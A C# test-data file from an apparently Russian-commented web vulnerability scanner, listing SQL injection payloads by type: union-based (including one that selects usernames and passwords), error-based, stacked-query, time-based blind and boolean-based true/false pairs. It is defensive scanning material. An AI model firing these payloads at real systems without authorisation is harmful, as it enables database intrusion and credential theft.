using WebVulnerabilitiesScanner.Entities;

namespace WebVulnerabilitiesScanner.TestData
{
    /// <summary>
    /// Тестовые данные для SQL-инъекции
    /// </summary>
    public abstract class SqlInjectionTestData
    {
        public const int TimeValueForTimeBasedBlind_s = 5;
        public const int TimeBasedBlindRequestsCountForAverage = 3;

        /// <summary>
        /// Универсальные нагрузки для тестирования запросов
        /// </summary>
        public static readonly List<RequestSqlInjectionPayloadEntity> BasePayloadsInfo = new List<RequestSqlInjectionPayloadEntity>()
        {
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT username,password FROM users--", SqlInjectionType.UnionBased),
            new RequestSqlInjectionPayloadEntity("' UNION SELECT null,version()--", SqlInjectionType.UnionBased),

            new RequestSqlInjectionPayloadEntity("' AND 1=CAST((SELECT version()) AS INT)--", SqlInjectionType.ErrorBased),
            new RequestSqlInjectionPayloadEntity("' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--", SqlInjectionType.ErrorBased),

            new RequestSqlInjectionPayloadEntity("'; SELECT 1--", SqlInjectionType.StackedQueries),
            new RequestSqlInjectionPayloadEntity("'; SELECT version()--", SqlInjectionType.StackedQueries),
            new RequestSqlInjectionPayloadEntity("'; SELECT 1; SELECT 2--", SqlInjectionType.StackedQueries),
        };

        /// <summary>
        /// Нагрузки для проверки time-based blind SQL-инъекции, которые вызывают задержку в ответе при успешной инъекции.
        /// </summary>
        public static readonly List<RequestSqlInjectionPayloadEntity> TimeBasedBlindPayloadsInfo = new List<RequestSqlInjectionPayloadEntity>
        {
            new RequestSqlInjectionPayloadEntity($"' AND SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' OR SLEEP({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' OR IF(1=1, SLEEP({TimeValueForTimeBasedBlind_s}), 0)--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"'; WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"'; IF (1=1) WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' AND (SELECT * FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))a)--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"'; SELECT pg_sleep({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' OR pg_sleep({TimeValueForTimeBasedBlind_s})--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' OR CASE WHEN 1=1 THEN pg_sleep({TimeValueForTimeBasedBlind_s}) ELSE pg_sleep(0) END--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' AND IF(ASCII(SUBSTRING(database(),1,1))=97, SLEEP({TimeValueForTimeBasedBlind_s}), 0)--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' OR CASE WHEN (SELECT 1)=1 THEN pg_sleep({TimeValueForTimeBasedBlind_s}) END--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"' IF (SELECT DB_NAME())='master' WAITFOR DELAY '0:0:{TimeValueForTimeBasedBlind_s}'--", SqlInjectionType.TimeBasedBlind),
            new RequestSqlInjectionPayloadEntity($"1 AND (SELECT 1234 FROM (SELECT(SLEEP({TimeValueForTimeBasedBlind_s})))testTable123)", SqlInjectionType.TimeBasedBlind),
        };

        /// <summary>
        /// Пары нагрузок для корректной проверки boolean-based SQL-инъекции.
        /// </summary>
        public static readonly List<BooleanBasedPayloadPairEntity> BooleanBasedPayloadPairs = new List<BooleanBasedPayloadPairEntity>()
        {
            // Каждая пара описывает один и тот же синтаксис инъекции для истинного и ложного условия.
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' OR '1'='1'", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' OR '1'='2'", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' OR 1=1--", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' OR 1=2--", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' OR 1=1#", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' OR 1=2#", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' OR 1=1/*", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' OR 1=2/*", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' AND 1=1--", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' AND 1=2--", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' OR 'a'='a'--", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' OR 'a'='b'--", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' AND (SELECT 1)=1--", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' AND (SELECT 1)=2--", SqlInjectionType.BooleanBased)),
            new BooleanBasedPayloadPairEntity(
                new RequestSqlInjectionPayloadEntity("' AND ASCII(SUBSTRING('A',1,1))=65--", SqlInjectionType.BooleanBased),
                new RequestSqlInjectionPayloadEntity("' AND ASCII(SUBSTRING('A',1,1))=66--", SqlInjectionType.BooleanBased)),
        };
    }
}
